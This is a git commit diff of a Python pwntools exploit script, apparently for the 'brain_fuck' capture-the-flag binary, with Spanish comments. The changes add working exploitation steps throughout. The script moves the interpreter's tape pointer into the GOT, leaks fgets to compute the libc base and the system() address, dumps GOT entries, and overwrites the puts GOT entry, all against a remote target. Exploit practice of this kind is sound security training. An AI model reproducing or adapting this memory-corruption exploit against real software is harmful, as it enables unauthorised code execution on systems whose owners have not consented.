f9e8fe2479a1d5dd0ee697ffdda30bdab37487a9
physics-sp <physics-sp@protonmail.com>
2019-03-15 12:22:35 -0300

    logro correr indefinidos payloads contra brain_fuck

--- brain_fuck/exp.py
+++ brain_fuck/exp.py
@@ -5,6 +5,10 @@ from pwn import *
 
 #r2 -e dbg.profile=bf.rr2
 
+#libc = ELF('./libc.so.6')
+#print 'strlen:' + hex( libc.symbols["strlen"] )
+#print 'system:' + hex( libc.symbols["system"] )
+#exit()
 remoto = False
 remoto = True
 if remoto:
@@ -14,9 +18,8 @@ if remoto:
 else:
 	conn = process('./bf')
 
-main = 0x08048671
-p    = 0x0804a0a0
-
+p = 0x0804a0a0
+fgets_got = 0x804a010
 """
 +: suma 1(byte) a donde apunta p
 -: resta 1(byte) a donde apunta p
@@ -27,36 +30,19 @@ p    = 0x0804a0a0
 [: not supported
 """
 
-# hace que el binario vuelva a correr desde main
-def reset(pre):
-	# primero voy a tener que hacer que P apunte a la direc de ret, y dsp escribir ahi el address de main
+def sendPayload(payload):
 	global p
-	bytes_p = hex(p)[2:]
-	if len(bytes_p) == 7:
-		bytes_p = '0' + bytes_p
-	p_b1 = int(bytes_p[0:2], 16)
-	p_b2 = int(bytes_p[2:4], 16)
-	p_b3 = int(bytes_p[4:6], 16)
-	p_b4 = int(bytes_p[6:8], 16)
-	# aun no necesito los bytes de main, necesito el addr de ret
-	m_b1 = 0x08
-	m_b2 = 0x04
-	m_b3 = 0x86
-	m_b4 = 0x71
-	for pos in range(4):
-		if p_b1 < m_b1:
-			char = '>'
-		else:
-			char = '<'
-	exit()
-
-def get_libc_base():
-	conn.recvuntil('[ ]\n')
-	payload  = '<' * (144-3)
-	payload += '.<'*4
-	payload = reset(payload)
 	assert len(payload) <= 1024
 	conn.sendline(payload)
+	p -= payload.count('<')
+	p += payload.count('>')
+
+def get_system_addr():
+	bytes_dif = p - fgets_got
+	payload  = '<' * (bytes_dif - 3)
+	payload += '.<'*4
+	payload += '['
+	sendPayload(payload)
 	fgets = ''
 	for i in range(4):
 		fgets = conn.recv(1) + fgets
@@ -64,24 +50,48 @@ def get_libc_base():
 	print 'leaked fgets:' + hex(fgets)
 	libc = fgets - 0x5e150
 	print 'libc base:' + hex(libc)
+	system = libc + 0x0003ada0
+	print 'system:' + hex(system)
+	print ''
+	return system
 
-def leak_stack_pointer():
-	pass # no encuentro ninguno D=
+def get_got():
+	funcs = ['fgets', '__stack_chk_fail', 'puts', '__gmon_start__', 'strlen']
+	addrs = []
+	bytes_dif = p - fgets_got
+	payload  = '<' * (bytes_dif-3)
+	payload += '.<' * 4 * len(funcs)
+	sendPayload(payload)
+	for i in range(len(funcs)):
+		addr = ''
+		for j in range(4):
+			addr = conn.recv(1) + addr
+		addr = u32(addr)
+		print hex(addr) + ' - {}'.format(funcs[i])
+
+def overwrite_puts():
+	new_puts = 0x08048700
+	payload  = '<' * (136-3)
+	payload += ',<' * 4
+	payload += '['
+	sendPayload(payload)
+	conn.send('\x08')
+	conn.send('\x04')
+	conn.send('\x87')
+	conn.send('\x00')
+	print 'GOT puts overwriten'
+	print ''
 
 def main():
-	#leak fgets
-	stack = leak_stack_pointer()
+	conn.recvuntil('[ ]\n')
+
+	overwrite_puts()
+	get_system_addr()
 
 	conn.close()
 
 if __name__ == '__main__':
 	try:
-		reset('')#main()
+		main()
 	except KeyboardInterrupt:
 		pass
-
-"""
-esi
-:> ?v reloc.__libc_start_main 
-0x804a024
-"""
